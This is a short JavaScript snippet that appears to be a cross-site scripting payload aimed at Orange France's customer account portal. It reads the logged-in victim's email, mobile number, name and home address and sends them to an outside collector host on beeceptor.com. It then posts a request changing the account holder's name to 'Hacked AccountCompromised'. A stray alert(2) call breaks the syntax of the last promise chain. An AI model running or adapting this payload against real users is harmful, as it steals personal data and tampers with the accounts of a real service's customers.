fetch("https://espace-client.orange.fr/ecd_wp/account/identification", {
  headers: {
    "X-Orange-Caller-Id": "ECQ"
  }
})
  .then(response => response.json())
  .then(data => {
    const email = data.contactInformation.email.address;
    const mobile = data.contactInformation.mobile.number;
    const { cityName, countryName, postalCode, street } = data.identity.personalAddress;

    const firstName = data.identity.firstName;
    const lastName = data.identity.lastName;
    const params = new URLSearchParams({
      email,
      mobile,
      cityName,
      countryName,
      postalCode,
      street
    });
    fetch(`https://sdsdf.free.beeceptor.com?${params.toString()}`)
    console.log("email:", email);
    console.log("mobile:", mobile);
    console.log("firstName:", firstName);
    console.log("lastName:", lastName);
  })
  .catch(error => console.error("Error:", error));

const datos = {
  reasonId: "APPROVAL",
  firstName: "Hacked",
  lastName: "AccountCompromised",
  gender: "male",
  emailAddress: "test@gmail.com",
  uploadedFiles: []
};

const formData = new FormData();
formData.append("formBody", JSON.stringify(datos));

fetch("https://espace-client.orange.fr/ecd_wp/v2.0/account/changeCivilityRequest", {
  method: "POST",
  headers: {
    "X-Orange-Caller-Id": "ECQ"
  },
  body: formData
})
  .then(response => response.json())
  .then(data => console.log(data))
  alert(2);
  .catch(error => console.error("Error:", error));
